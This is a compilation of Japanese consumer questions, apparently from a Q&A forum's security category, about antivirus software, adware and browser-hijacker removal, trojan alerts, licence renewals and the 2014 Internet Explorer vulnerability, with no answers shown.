ノートンの全スキャンをしてもCookieしか見つからず、ウイルスの類いは全く見つからなかったのですが、不審な行動（何もしていないのに勝手にカメラが起動する）があった為パソコンに詳しい父親や掲示板に相談したところ、ウイルスが潜り込んでいる為にノートンの全スキャンで見つからないのではないか、と言われました。そこで、父親に頼んでパソコンをリカバリしてもらい、Windows Update及びノートンの再インストール、Winのファイアーウォールを有効にした時点まで整えてから、手持ちのホームページビルダーをインストールしました。 リカバリ前に父親の指示で必要なものをCD-ROMにバックアップしたのですが、CD-ROMでもウイルスに感染する可能性があると知り、リカバリ後のパソコンにデータを移すのが怖いです。調べてみるとCD-ROMをウイルススキャンして大丈夫であればデータを移しても構わない、とありましたが、その手順がいまいち分かりません。先ず始めにCD-ROMを入れ、起動させずにドライブ自体をウイルススキャンすれば良いのでしょうか？USBの場合は差し込んだだけでウイルスに感染するそうですが、CD-ROMの場合はパソコンに挿入してそれを読み込むことによってウイルスに感染したりはしないのでしょうか？また、もし宜しければ正しい手順を教えて頂けませんでしょうか。 個人の趣味でサイトを運営しており、メインページ等はすぐに組み上げて再度新しく作るつもりでいるのですが、4年も書き貯めていた小説のデータがありますので、そちらだけでも移行したいと思っています。 リカバリ前の全スキャンでウイルスを見つけることが出来なかった為、もしCD-ROMに入っていてもウイルススキャンで見つけ出すことが出来ないのではないかと不安に思っています。 何卒アドバイス宜しくお願い致します。
今月末で期限切れです、通販でダウンロード版を購入しました（新シリアル番号が来ました）。6/1に新しいシリアル番号を入れますが、現在３台使用中の場合、個別に入れるのでしょうか（１台すれば自動であとの２台も更新になるのですか）。また、期限切れても１週間は大丈夫だそうですがこれは本当ですか。
PCをスキャン（マカフィーのフルスキャン）したところ、 「1つのウイルスまたはトロイの木馬がファイルから検出されました」とスキャン結果が出ました。 （因みに、「ご使用のパソコンは安全な状態です」とも表示が出てます。また、“セキュリティレポート”というのを見ると“検出した脅威”の項目のトロイの木馬の数が増えたため検出されたのはトロイの木馬だと思います） 何のファイルから検出されたのかは、わかりませんでしたがこの状態危険だと思いますか？どのような危険性があると思いますか? ウイルスが存在している中、複数のサイトでIDやパスワードを入力しましたしネットショッピングではクレジットカードも登録してるので心配です・・・
YTDownloaderというプログラムが誤ってインストールされてしまいました。 プログラムのアンインストールを行おうとすると、All Chrome Browser Windowsを閉じろというメッセージが表示されるのですが、何も開いていない状態でも表示され、アンインストールができません。良い解決策を教えてください。
Trojan:Win32/Tivmonk.A　カテゴリ：トロイの木馬　というウィルスに感染してしまいました。、このウィルスをパソコンから 削除するにはどうすればいいですか？ウィルスの動きは、クロームなどのブラウザを立ち上げると、新しいタブが突然、たちあがり、 動画を早くするためのソフトをインストールしてください！という内容です。 ブラウザはクロームを使っています。違うサイトを見ようとすると、勝手に新しいタブがでて、 iLividとかいうバナーが表示されて iLividをダウンロードしてインストールしてくださいと表示されます。 もぅこの勝手に表示される宣伝バナーを表示させな方法を教えてください。 自分でいろいろとiLividで迷惑をしているサイトを見て自分なりに削除方法をやってみたのですが、 クッキーがなんだの、プロンプトでどうのこうのと、削除方法は書いてありますが、全然、わかりません。
outlook.comで勝手にメール送信されているようで、下記のメールが届いたとのことですが、ドメイン元は海外の家具屋で、ワードプレスのコメント欄のURLっぽいのですが、このようなメール送信ウィルス？などは存在するのでしょうか？ このあたりの件でお詳しい方がいらっしゃいましたら、どうぞお力をお貸し頂けますと幸いでございます。 http://maa.cz/wp-content/themes/default2/beside. … &26524; &27193;
Trojan:Win32/Tivmonk.A　カテゴリ：トロイの木馬　というウィルスに感染してしまったのだが、このウィルスをパソコンから 削除するにはどうすればいいですか？
アバストでクイックスキャンをしようと思ったのですが スキャン方法を選択するところにブートタイムスキャン以外の選択肢がでてきません。 選択肢を復活させる方法はありますか？
ESET NOD32 Antivirusでウイルスを検出したようなのですが、画像の表示が何度も繰り返しでます。 ファイルの場所に行ってみたら「ApbeBlik.dat」というファイルが消えては出現しを繰り返しています。 パソコンの動作も重くなり困っています。 対応方法を教えてください。
体験版をインストールしています。 途中で「新しい更新プログラムを利用できます」というアイコンがタスクバーに現れて、起動するとダウンロードするようになりました。 　リアルタイムスキャンも始まります。 そこでヘルプを参考にして起動が一番早くなる設定に直し、再起動させてネットに繋いでみると変化ありません。タブが開くのにタバコを２本吸って待つ、という状態です。 windows service pack 1がどうしてもインストール出来ないので、このためにウィルスに感染しているのかもしれません。しかし、これはリカバリーしないとインストール出来ないとのMicrosoft者からの答えがあり、現状では諸事情のために不可能です。 この状態で起動を軽くする方法、あるでしょうか？宜しくお願いします。ベストな方法がないなら、ベターな方法を教えてください。 　
ＦＣ２の無料掲示板を借りていますが、海外のサーバを経由したスパム投稿に荒されています。 フリーソフトをインストールしようと思うのですが、以前マルウェアを踏んだときに削除するフリーソフトがまたウィルス感染させるダミーだったこともあり、慎重になっています。 数字認証を一時期していましたが、それでも時々スパムが入りました。 検索すると年代が古すぎるものばかりで、新しいフィルタリングの方法やフリーソフトをご存知の方、教えてください。宜しくお願いします。
ウィルスバスタークラウドを長年使用しています。 末まで迷惑メールで困ったことは無かったです。 しかし最近、山のように届く迷惑メールに困っています。 某電気店のスタッフに相談したらウィルスバスタークラウドでも 迷惑メール対策を設定することができるようです。 ただしPC音痴の私はウィルスバスタークラウドの迷惑メール対策の設定などできません。 迷惑メール機能がついているのに使用しなければ宝の持ち腐れですよね。 どなたか親切な方！迷惑メールの設定の仕方を丁寧に教えて頂けませんでしょうか？ またこの程度のことを電話で質問したら教えて頂けますでしょうか？ よろしくお願いいたします。
カスペルスキーの２０１３年版を使っています。 ペアレンタルコントロールのアダルトなどのブロック機能ですが google画像検索などの検索結果に沢山アダルト画像が出てきます。 （検索先はちゃんとブロックされてアクセスできないようになっています） カスペルスキー以外で検索結果もブロックできるものを教えてください。 或はカスペルスキーで検索結果のブロックの仕方を教えてください。 お願いします。
先日、送られてきたメールの資料が読めなくて、無料のｐｄｆをインストールしようとしましたら パソコンの機能が低迷しておりますとあたかもマイクロソフト社からのメッセージかと思われる画面が出てきましたので、思わずクリックをしてしまいました。 それから、エクスプローラーを立ち上げる度にWin8の修正をしますという画面しか出てこなくなりました。 その後、一旦インストール前の日にちに修正をかけたのですが、 ホームページだけが、何度Ｙａｈｏｏで設定をしても立ち上げる度に 下記のページになってしまいます。 　　　　↓ http://www.trovi.c**/?gd=&ctid=CT3320133&octid=E … アンインストールの画面を見てもおかしなものは見当たりません。 どうしたらこのおかしなページを削除する事が出来るでしょうか。 あまりパソコンには詳しくないのでわかりやすく教えていただけないでしょうか。 よろしくお願いいたします。
Windows８のPCにウイルスバスタークラウドを入れてるんですけど設定を完璧にしてウイルス等から守る場合※コンピューターの保護設定※のとこに入れるチェックウイルス/スパイウェア対策に全てチェックを入れ保護レベルを高にして予約スキャンにチェックも入れてweb脅威対策も高設定でtrendツール、ブラウザガードにもチェックを入れて迷惑メール対策も全てにチェックを入れる、ネットワーク対策もファイアウォールチューナー、無線ランアドバイザにもチェックを入れてメッセンジャー対策にもチェックを入れ、snsプロテクションの有効プライバシー設定チェッカーの有効、データを守るとこでは情報漏えい対策の有効リモートファイルロックの有効等を完璧にしてればウイルスには入られませんよね！！？ ウイルスバスタークラウドのバージョンは7.0.1240です
あるアンチウィルスの広告「OOOによる保護が無効になりました」がパソコンを開くと毎回 でてきます。無料の同社のアンチウィルスに登録していますが、広告は有料のものです。 毎回でますので消したいと思います。消し方を教えてください。
富士通のLIFEBOOK UH75/K Windows8.1を使用しています。既定のブラウザはChromeです。 どのタイミングで、なんのソフトやアプリと一緒にインストールしてしまったかわからないのですが、いつのまにかブラウザの上部に、、ASKの検索バーが出ていました。 プログラムのアンインストールで、こんなプログラム入れた覚えがないというプログラムを削除したり、ブラウザの設定でASK関連の項目を削除すると、その時は消えてでなくなるのですが、Windowsが自動で更新プログラムをインストールして再起動すると、Chromeで新しいタブを開くたびにASKの検索バーが出てきてしまいます。 というか、ASKを削除したタイミングで、更新プログラムがインストールされている気がします。ASKが気になりだして、ASK削除をしだしてから、毎日更新プログラムがインストールされるようになりました。 これはなにかのウィルスに感染してしまったりとかの可能性もあるのでしょうか？ セキュリティソフトは、Kingsoftの無償版を使っていて、ウィルススキャンをしましたが、なにも検出はされなかったのですが。
「Windows のPC修復」等数多くの悪質広告が割り込みＷｅｂ閲覧が出来ず困ってまます。「regcleanpro」などはアンインストールしてもregeditでレジストリからregcleanproにかかわる項目を削除しても排除できません。 Windows Defenderは 有効になってますが効果ありません。 Windows Defender 有効のためmicrosoft以外のセキュリティーソフォフトは使ってません。 悪質広告を何んとかしなと新しいページを開く度に突如割り込んで来てインターネットが出来ません。 対策を教えてください。
windows7を使っています。 ネットバンキング使用時のウイルス対策の為に、「SaAT Netizen」をインストールしました。 Google Chromeでネットバンキングを使っております。 使用はじめて暫くして画像のような表示が出てきました。 Google Chrome起動時に必ず出てきて、ＯＫをクリックしても、何度も何度も出てきます。 その間はネットバンキングにアクセスしておりません。 「再起動して」とのことだったので、とりあえずクロームを再起動したのですが、相変わらず出てきます。 再起動は1日１回を3日間程度しましたが、特に変わりませんでした。 どうすれば表示がなくなるのでしょうか？ お願いします…；；
ESETというセキュリティソフトを使っています。 ソフトを定期的にスキャンすると、セキュリティを強化できると Windowsの画面に表示されますが、 本当に定期的なスキャンで強化されるのでしょうか？ 最新ウィルスに対応は出来ないのではないでしょうか？
Windows用です。中国製、韓国製以外のウイルスソフトを教えてください。
AVGでスキャンしたら下記のメッセージがでました。 もう対処されていると思うのですが怪しいソフトなんて使った覚えはないしちゃんとマイクロソフトの セキュリティエッシェンシャルを入れてたのになぜ感染したのですか？ 感染経路とそれぞれのウイルスの性能を教えてください 破損した実行ファイル, C:\Windows\SysWOW64\mfc45.dll アドウェアInstallCore.AW, C:\Users\k\Documents\Downloads\DownloadAcceleratorSetup.exe MalSign.InstallC.66E が見つかりました, C:\Users\k\Documents\Downloads\DownloadManagerSetup.exe トロイの木馬Generic35.BTEK, C:\ProgramData\InstallMate
パソコンをしているとMcafeeが出てご使用のパソコンは危険は状態ですと出ました パソコンを買ってウイルス対策などしていません やり方など教えてください 素人などでわかりやすくお願いします
お世話になります。 マカフィーとウイルスバスターはパソコン内で共存できますか？ あとマカフィーとウイルスバスターではどちらが優れてますか？ よろしくお願いいたします。
ウイルスバスター２０１１クラウドをアンインストールする方法についての質問です。 マカフィー製品をインストールしたいので、 相互関係にないウイルスバスター２０１１クラウドをアンインストールしなければならないのですが、 アンインストールの作業をすると『Ｌｏａｄ Ｆａｉｌｅｄ』という英語表記のメッセージが出て、 アンインストール出来ません。 起動の作業をすると、【問題が発生したため、プログラムが正しく動作しなくなりました・・・・・】とのメッセージが出ます。 ウイルスバスターは、お試しで少し使った記憶がありますが、その後は使用しておらず、ずっとマカフィーを使用しています。 どうしたらアンインストール出来るでしょうか？ ※説明不足でしたら、また補足させていただきます。
友人にメール添付でファイルを送ったところ、「禁止されているファイルの種類です。このメッセージには危険な可能性のある拡張子のファイルが添付されています。ファイルは無効にされました。」というメッセージが出てファイルが開けないという通知がありました。 察するところ、相手先のパソコンに入っているセキュリティソフトによってけられたのではないかと思うのですが、当たっていないかもしれません。 この様な事もあるのではないかと思い、まず自分のパソコンに添付ファイルを送ってみましたところ、問題なく開けました。ファイルは、ホームページビルダー（Ｖｅｒ１６）で作ったファイルです。 ファイルがホームページビルダーに依存して開けたり、しなかったりするのかと思い、ホームページビルダーの入っていない別のパソコンにも送ってみましたが問題ありませんでした。 私の使っているパソコンのＯＳは二つともＷｉｎｄｏｗｓ７でセキュリティソフトはノートン36０です。 相手方には、一時的にセキュリティソフトを外して見て下さいと伝えましたが、あたっているかどうか分かりません（まだ返事はありません）。どうしたらよいか教えて下さい。
FireFoxを使って普段からアクセスしているサイトで動画を見ていたのですが 突然添付の画面が出てブロックされました （視聴動画（URL)を切り替えたタイミングで発生 ドメインは同じものです） 直前に表示していた動画のURLをロケーションバーに入力しても同じ画面でブロックされました （URLはマスクしています） その間ブラウザ再起動もしてませんし ウイルス対策ソフトなどのアップデートなども走っていません ページ説明などを見てるとGoogleのセーフブラウジングが動いている様なのですが なぜ突然動いたのかがわかりません（本当にそれが動いたのかも定かではない） 別の操作を行っていくことで(ブラウザ表示上のクリック動作のみ） 再度視聴できるようになっていますがこれが一体なんなのかわかる方いますでしょうか？ FireFoxは数年使ってますしウイルス対策ソフトもここ数か月Avastを使っていますが 今回のような表示が出てきたのは初めてです 一番知りたいのは これを表示している実態のプログラムは何なのか ということです (そしてなんで突然動いた上に直前に見ていたサイトまでブロックされたのか）
ウィルスソフトでウィルスバスターかカスペルスキーの２つのソフトで迷っています。 色々検索して比べてみましたが、評価するサイトによって、評価が違う為迷っています。 セキュリティの高いソフトを希望していますが、その他にもお勧めがあれば教えて下さい。
PCにウイルスバスタークラウドをインストールしました。 インストールした後、色々設定をいじっている際に、メールアドレスとパスワード登録があったので、登録したのですが。 やっぱり消したいです。 設定のところから、「設定をパスワードで保護する」のチェックをはずして適用すれば、パスワードも何も入力の必要がなくなりますが、私がしたいのは、登録したメールアドレスそのものを消すことです。 保護を出来なくしたいのではなく、アドレスを消したいのです。 それって出来るのでしょうか・・・？それとも一度メールアドレスを設定した以上、ウイルスバウタークラウドにはずっと登録されたままでしょうか？ すみませんお願いします・・・＞＜；；
Norton Internet Security を使用しています 普段ファイアウォールのルールに付け加えたいことがある時には 設定 - ネットワーク - スマートファイアウォール - 拡張設定 - トラフィックルール からルールを追加しています //communityjp.norton.com/t5/forums/forumtopicpage/board-id/NIS_NAV/thread-id/1627 というトピックスを見ていて疑問に思ったのですが 設定 - ネットワーク - スマートファイアウォール - 信頼制御 から似たような操作が出来るようです 今まで信頼制御の使い方がいまいち分からなかったのですが 拡張設定とはどのような違いがあるのですか？ 優先順位とかが違うのですか？ 使い分けている方がいれば具体的なアドバイスお願いします
セキュリテイ　ソフトについてご質問致します。 macafeeと無料で Microsoft Security Essentials について win7インストールしましたが 2つともいれて使おうと思いましたが うまくはいりません macafeeは契約期間がのこっていて 再インストール試みましたが CDもダウンロードも うまくいきません インストール できません 無料で Microsoft Security Essentialsで セキュリテイは十分でしょうか 十分ならわざわざお金払ってアフターの悪い ソフト使うより 無料で Microsoft Security Essentialsを 使う方が良いと思いますが？ macafeeは重くて 購入して使っていても OSが変わっただけで 再インストールできません 4ヶ月ぐらい 残っています。 理解力が足りないとは思いますが 無料一本でどうでしょうかご意見 ご回答宜しくお願い致します。
WIN8.1のWindowsDefenderのアイコンって何処にあるんですか？見つかりません。 ファイルはCドライブにあるんですがdll？ファイルばかりで開けません。 タスクにもないし。クイックスキャンしたいんですが何処にあるか教えて下さい。 ファイヤーウォール等は有効になってます。
「NTTから緊急のお知らせ」なるものが届きました。うっかり開いてしまいましたが、同じものが３通も来るなどいかにも怪しいです。これについての情報をお願いします。
４時間ぐらい前から bhsktdy.datにTrojan.ADHのリスク　自動保護で遮断しましたとノートンが通知してきます。 ６分おきにbhsktdy.datを遮断しましたとまた通知が来ます。 bhsktdy.datで検索しても引っかからずTrojan.ADHも不正プログラムのノートンの総称みたいで、 よくわかりません。 bhsktdy.datの場所はc:\programdata\bhsktdy.datです 間隔をおいて通知されるのは遮断してもまたそのファイルができているってことだと思うんですが、 どういった対策をとれば解決するんでしょうか？ win7 ノートンは最新版です。
いろいろな物があると思うのですが皆さんはどのサイトを一番良く見ますか？ 私はもちろんOKWAVEですがどこが一番お勧めでしょうか？ こういった無料のサイトはだれでも参加できるわけですから例えば2chのセキュ板でバンバン書込している人もここでもバンバン質問しても問題ないわけですよね。 セキュカテとセキュ板の違いも教えてもらえると助かります。
ウィルスバスタークラウド(２０１３？２０１４？)を使っています。 ＯＳは７ＨＯＭＥで、６４ＢＩＴです。 最近になって、ＰＣを起動してしばらくすると、ＦＬＡＳＨＰＬＡＹＥＲ．ＥＸＥが必ず２個？２回？ ひっかかります。 毎回、削除されているようですが、毎回出てきます。 また、ウィルスはトロージャンホース？トロイの木場らしいのですが、ＴＲＯＪ＿ＳＰＮＲ．２７Ｃ４１４と 出ています。 毎回出るとはいえ、一応検出しているので不安はありませんが、 根本的に解決するにはどうしたらいいでしょうか？ 今まで、ウィルスバスターでＦＬＡＳＨＰＬＡＹＥＲが検出されたことがなかったので、 どうしたものかと思っています。 一端、削除してから最新のものをいれたほうがいいのでしょうか？ ブラウザに影響が出たら困るというのもあり、まだ何もしていない状態です。
最近、WindowsXPのサポートが終了し、脆弱性というキーワードが話題になりましたが、OS以外にも古いソフトを使っていると脆弱性（セキュリティホール）がある場合があると思います。そこで、今自分が使っているソフトを含めて、自分のパソコンにどれくらいセキュリティホールがあるのか調べたいのですが、何かよい方法はないでしょうか。簡単に検査できる無料のツールがあれば是非教えてください。ちなみに、ウィルス対策ソフトとしては、Avast!の無料版をインストールしております。
最近、インターネットエクスプローラーを立ち上げると、左下に、ポップアッププログラムが出て、とてもこまっています。 http://dailynews.yahoo.co.jp/fc/entertainment/wi … http://cdn.adnxs.com などのサイトが出てきます。 たしか、ipadと同期させようとしてsplashtopstreamerそれからsmartnotebook11 というアプリをインストールしたあたりからなったような気がします。とても困っています。教えてください。
Google Chromeを起動すると下記のメッセージが表示されて来ます。 修復出来ず困っています。 ―――――― アラート アドバンストシステムプロテクターが アイテムを二個検出しました すぐにそれらのアイテムを消去することを推奨します。 　　今すぐ消去 □今後このウィンドウを表示しない　 Microsoft Partner ―――――― ―――――― お勧めします 　ご使用中のＰＣは動作が遅くなっている場合があります エラーをスキャンしPCを新品のように 速く動作させましょう わずか２分しかかかりません(推奨) 無料ダウンロード ―――――― と　ボタン押下を要求してきます。 　 Microsoft Partnerとの表示しているので信頼できるのかな？と 思ったりもしていますが、 advanced System Protectorなどというソフトをインストールなどはしていないので どうするか迷っています。対処方法を教えてください。 firefoxをインストールした時に意図しない動作となった物と思われます。 なお、 advanced System ProtectorとGoogle Chromeはプログラム削除して、 レジストリのクリーナーと最適化は、ノートンユティリティーで実行して 改めてGoogle ChromeインストールしましたがGoogle Chromeを起動すると 再びこのアラートを表示します。 advanced System Protector 41マルウエア 感染アラート
プレインストール版のウィルスバスター・クラウド（９０日）を更新延長するには、 シリアル番号というのが必要なのですか？ どこを探しても見つからないのですが、 取得方法を教えてください。
購入したパソコンに入っていた McAfee をそのまま使っていました。 試用期間の最終日にあたる昨日、朝パソコンのスキャンを始めたら夜中になっても止まらないのでそのまま寝てしまいました。 そして今日見たら、McAfee が有効になっているんです。 試用期間が過ぎたのなら使えなくなっていると思っていたのに。 McAfeeの試用期間が過ぎたら使わないつもりだったんですけれど、どうすればいいのでしょう？
ブラウザはクロームを使っています。違うサイトを見ようとすると、勝手に新しいタブがでて、iLividとかいうバナーが表示されて iLividをダウンロードしてインストールしてくださいと表示されます。もぅこの勝手に表示される宣伝バナーを表示させな方法を教えてください。自分でいろいろとiLividで迷惑をしているサイトを見て自分なりに削除方法をやってみたのですが、クッキーがなんだの、プロンプトでどうのこうのと、削除方法は書いてありますが、全然、わかりません。
　自宅のパソコンではGoogleクロームを検索エンジンとして使用しているのですが、最近ウィルスと思われるものに攻撃されて困っています。 そのウィルスは、戦車などが登場するゲームが勝手にフォルダになって表れてきます。 ノートンやマカフィなど一応のウィルス対策ソフトは入れていますが、ウィルスの方が一枚上手のようです。 そのウィルスが頻繁にやってくる少し前に、マイクロソフト社からこれまた勝手に送り込まれてきたプロレジスキャンとかいうソフト、これが“うざったくて”“邪魔くさい”ためプログラムを消去しましたが、それも怪しい感じに勝手に起動され、有料ソフトの購買を促すようなものでした。 　何が本当で、何がウィルスなのかよく分からない状態にパソコンが犯されているようなのですが、何かよい対処法はあるでしょうか、教えてください。
題名の通り、ブラウザやWindowsUpdateなどが、インターネットに繋がらなくなってしまいました。 OSはVistaです。 しかし、セキュリティソフトのESET smart security6のアップデートは今も更新できるため、PC自体はネットに繋がっているようです。 ブラウザはOperaを使用していますが、どのページも表示されず、IEも同様に表示されません。 WindowsUpdateも、エラーコード80072EFDとなり更新できません。 このエラーコードはファイアウォールによってブロックされたためネットにアクセスできなかったために出たようで、WinUpdateのみ許可設定に追加してくださいとあります。 ファイアウォールはESETを使用していますが、最近ファイアウォール設定を変更したことはないため、急に繋がらなくなったことがファイアウォールのせいだとは考えにくいです。 とは言え、心当たりがないわけではありません。 最近ウィルスに感染し、プログラムの削除やレジストリなどをいじって駆除した為、Windowsそのものの調子が悪くなっている可能性があります。 また、つい先日、ESETが自動駆除で、いきなりCドライブ-ユーザー-AppData-Local内に存在していた、 Au.exe、Bu.exe、Cu.exe・・・(以下アルファベットZまで全26ファイル)というファイルを隔離しました。 なぜかは分からず、またこれらのexeファイル全てが本当に悪いファイルなのかは調べても分かりませんでした。 プログラムの削除やレジストリをいじっていた段階ではネットに繋がっていましたが、ファイルの隔離以降に繋がらなくなった気がします。 試しに隔離を解除して復元してみましたが、ネットには繋がりませんでした。 システムの復元もオフだったため、復旧できません。 もはやOS再インストールしかないかと思っていますが、何か原因や復旧できる方法が分かる方がいらっしゃいましたら、アドバイスいただければと思います。 よろしくお願いします。
これを使うと問題あるということらしいが どうしたらよいのでしょう 教えてください
気味の悪いウイルスに感染したかのような広告が表示されるのですが、どうすれば消えますでしょうか？ ニコニコ動画などのページの広告部分に画像のような気味の悪い広告が表示されます。 マカフィーでCドライブ全体をスキャンしたところ異常はないようなのですが... スパイウェアと呼ばれるものでしょうか
ＩＥの修正プログラムが配信され、自動的にインストールされると聞きましたがその結果の確認はどのようにすればよいのでしょうか。教えて下さい。（Windows　Ｖｉｓｔａ　goo版ＩＥ9.0を使用中）
１ ネットからダウンロードしたPDFファイルを開いたら、 ウィルスに感染する事ってありますか？ ２ 同様に、ネットからダウンロードしたMP3ファイルを開いたら、 ウィルスに感染する事ってありますか？ ３ あるプログラムファイルをダウンロードしたら、完了間際に「セキュリティーのスキャン中」と出ます。 これは、ソフトが自動でスキャンしているのですか？ これが出れば、後で自分で右クリックして、「ＤＬしたファイルの脅威の検索」をする必要はないですか？
いつの間にかRegclean Proがインストールされてしまい、画面がうるさくてたまりません。ネットで調べてアンインストールしようとしましたが、プログラムの名前にも発行元にもRegclean Proの表示が無く、どのプログラムをアンインストールすれば良いのか判りません。どうしたらアンインストール出来るかお教えいただきたく宜しくお願い致します。
Ｗｉｎ７，　ＩＥ１０を使っています。 今問題になっているIEの脆弱性対策をしようと思ってWindows　Upｄａｔｅを開くと重要な更新プログラム１個とオプションの更新プログラム２個が表示されます。重要な更新プログラムはＩＥ１１をインストールするプログラムで何度実行しても失敗します。オプションの一つはなぜかＩＥ１０をインストールするプログラム、もう一つはＢｉｎｇに関するものです。 脆弱性対策プログラムはどうやったら入手できるでしょうか？入手出来ないのはＩＥ１１がインストール出来ないのと関係があるのでしょうか？ 詳しい方、よろしくお願いします。
ｊａｖａを利用しようとするとセキュリティー設定のためブロックされますとのコメントが出てきて利用出来ません。ウイルスバスターも削除しエクスプローラーの設定もし直しましたが効果がありません。 何が原因だと考えれるのでしょうか？ アドバイスよろしくお願いします。
　 一つはっきりさせたいのですが、torrentを使うことは不正行為なのですか。 　
Macbook ProにMac版のマカフィー　インターネットセキュリティをインストール しています。 iTunesでiPhoneとのWiFi同期をしようとすると、ファイアーウォールが 邪魔して、出来ません。 セキュリティソフトのファイアーウォールをどう設定すれば、いいかわかる方 教えていただけませんか。 特に、Mac版のマカフィーは設定の仕方が難しいのですが。
ＩＥの脆弱性対策更新プログラム が公開された様です。(http://jp.techcrunch.com/2014/05/02/20140501micr …) このＨＰを見ると、「Windows Update」を使用しているユーザーは特別な処置をしなくても自動的に更新プログラムが実行されるという事です。 現在使用中のＰＣは幸いWindows Updateを使用しているわけですが、昨日以来メディアでも大きく取り上げられ大騒ぎになっている問題ですから非常に心配です。 つまり、上記のＩＥの脆弱性対策更新プログラムを自分のＰＣが本当に実施済なのか否か？確認を取りたいのです。Windows Updateの「更新履歴を表示します。」という機能を実施しても確認が出来ず困っています。 お手数ですが、この件の確認方法について教えて下さい。
現在バスターを使用し5月末が期限です。 某ショップでは、バスターをダウンロード版３年で更新すると２ヶ月延長サービスとありますが、一部で更新されないとあります。これは(1)期限終了後に（６月に入ってから１週間以内に）更新すればよいのか　(2)新規の登録のみでシリアル番号の書き換えでは不可なのでしょうか。どうしたら２ヶ月延長になるか教えてください。
結構WindowsPC系ソフトは、ウィルスバスターのような保護がないとやられちゃうっと聞きますが、 Macはこんなリスクないですか？ 全くの素人ですみません… 毎年WindowsPC用のウィルスバスターの使用に料金がかかるので、３年まとめて１万以上の金額もするし… そして、最近のWindows８もどんどん遅くなってきていて 一層Macに変えてみようかなと思いました。 みなさん、是非ご意見をよろしくお願いします！
今、IEの重大な脆弱性が指摘されています。 私は昨日の夜までそれを知らず、IEを使っていました。 今回の攻撃は、FLASHを使ったものということですが、不運な事にFLASHをメインで使ったサイトを利用していました。 1.ハッキングされた場合、確認する方法はありますか？また、既存のウイルスバスターで検索しても意味ないですか？ 2.職場や学校、図書館などの公共性が高い、管理者が管理している下のパソコンで上記のことをしてクラッキングされた場合、被害に合うのは使用者が使用したパソコンやアカウントですか？ 回答お願いいたします。
パソコン初心者です。 手持ちのノートパソコン（Windows　ＸＰのシールが貼ってあります。）にウイルスセキュリティの期限切れのメッセージが入っています。今迄は、セキュリティゼロを入れていますが、これも切れているようです。このパソコンを使い続けたいのですが、方法ありませんか？
カテゴリーがここで良いのか、もし違っていたらすみません。教えてください。 インターネットエクスプローラーの事を色々言ってますが、あれってウイルス対策ソフト(ウイルスバスター）入れてても危険ってことですか？グーグルクロームってのを入れたんですが、使いにくくって…　結局どんな方法でもネットの危険性はゼロにはならないのでしょうし・・・
私の知人はＷｉｎｄｏｗｓ７です。コントロールパネルのＪａｂａアイコンを開くと 「Ｊａｖａ６　ＳｔａｄａｒｄＥｄｉｔｉｏ」のアップデート２３になっています。今回Ｊａｖｅの脆弱性解消のため アップデートを実行するように話しましたがアップデートのタブが表示されていないため 出来ないと言ってきました。 Ｊａｖａのホームページでは古いバージョンは削除して最新のものをインストールするように ガイドされています。 ついてはコントロールパネルのプログラムアンインストールからバージョン６をアンインストールしてサイトより７をダウンロード＆インストールするように指示しようとおもいますが、この処理を実行した時コントロールパネルのＪａｖａアイコンは６から７に自動的に変更されるのでしょうか ご存じの方教えてください。　お願いします。
仮想環境課(VirtualBox)のゲストOS(XP [JP/EN]/7[JP] いずれも同じ）で試しています 　　ネットワークアダプタはブリッジ 設定で使っています 経緯としてはXPの英語版でMSEインストールしてた環境があったのですが サポート終了に伴い MSEアイコンがスキャン中以外常に危険(赤）アイコンになってしまうようなので AVG アンチウイルス 2014 を使ってみようかなと思い 公式サイトから無料版のダウンロードを行ってインストールしたのですが(Basicの標準インストール) インストール(j常駐）したとたんにDNSによる通信が遮断されてしまうようで ゲストOSのみならず LAN接続している他の機器からもネットアクセスがエラーになります 　　HOST OS ももちろんの事　関係ない別のPCもが影響受けます 　　　(ルータに何らかの影響を及ぼしてると思えます） そんな状態なのでインストール後のアップデートも当然のことながら失敗します ゲストOSを落として(シャットダウン）20分ほど放置してからアクセスしたところ現象は回復しました ゲストOSを落としてルータ再起動しても復活しますが その時ゲストOS起動したままですと改善しません 可にテストではLAN内通信に支障はありません ルータとして使っているのはWiMAX端末（URoad-7000）で無線接続となります 　　（UPnPとかも対応してないはずなんですが　なんでルータに影響与えるのかが謎です） 初めルータが壊れたのかと思ったのですがよくよく見たらサインINしたSkype は オンライン状態維持されたままだったので不思議に思い IP直で　www.yahoo.co.jp(182.22.40.240)　にアクセスしたところ開けたのでおそらく問題は DNSだけではないかと思われます 他のウイルス対策ソフトもいくつか使用したことありますが このような状況になったのは初めてです AVGは 数年前に一時的に使った事はありますが当時とは PC・環境共に別でトラぶった記憶もありません 原因や回避策など思い当たる人がいたら教えてください
そうでしたら対処法を教えてください。 できれば初期化以外の方法で・・・
コーディックパックをインストールしてみた所↓ http://www.gigafree.net/media/codecpackage/klite … trovigo.comに接続されるようになり、speedtest127やFreegame111、PCPerformer が勝手にインストールされ コントロールパネルからプログラムのアンインストールを行っても削除できませんでした！ trovigoに至ってはありませんでした！ ￥speedtest127～exeや￥Freegame111～exe は、よく何度も警告が出るので許可しないを連続でおしてます！ これらを削除したいのですが やり方が解らず相談させて頂きました！ ブラウザはインターネットエクスプローラー11 です！ よろしくお願いします！
最近に成ってド派手なコマーシャルが出る様に成りました。 赤い縁が出たりして記事の閲覧の邪魔に成ります。 何が原因でしょうか？ 詳しい方にご指導御願いします。 PCはｈｐ pavilion HPEでWindows７，GoogleChromを使っています。
枠に入っての警告です。 internet　Explorer　ｓeｃurity WEBサイトで、このプログラムを使って、WEBコンテンツを開こうとしています。 このプログラムには、発行元を確認するための有効なデジタル署名がありません。このプログラムは保護モードの外で開かれ、コンピューターが危険にさらされる恐れがあります。信頼している発行元からのプログラムだけを実行してください。 名前：C:\Program 発行元：不明な発行元 □今後、このプログラムに関する警告を表示しない。 　許可する　　　許可しない 以上の警告が出ます。プログラムダウンロード中ではありません。 １、許可するにしても許可しないにしても、繰り返し出る。 ２、今後この警告は～～　をチェックしても出る。 この警告の原因と出ないようにしたいのですが、アドバイスをお願いします。
今「ウィスルバスタークラウド」の体験版をセキュリティソフトとして使っています。 ところが、これにはファイヤーウォール機能がない、とあります。 そこで、一応windowsにもファイヤーウォール対策機能が付いているのでそのままにしてあります。 が、クラッカー被害が多く（カルト批判などしているため）、フリーソフトもインストールしてみましたが、エラーが起きて役に立ちません。他の総合的なセキュリティソフトの体験版はほぼ使い終えた状態です。 (1)お奨めのファイヤーウォール対策のフリーソフトを教えてください。 (2)総合的なソフトとしてあなたなら何をお奨めしますか。有名なものは全て体験しましたが、これと言った決め手がありません。 その他のアドバイス、よろしくお願いします。
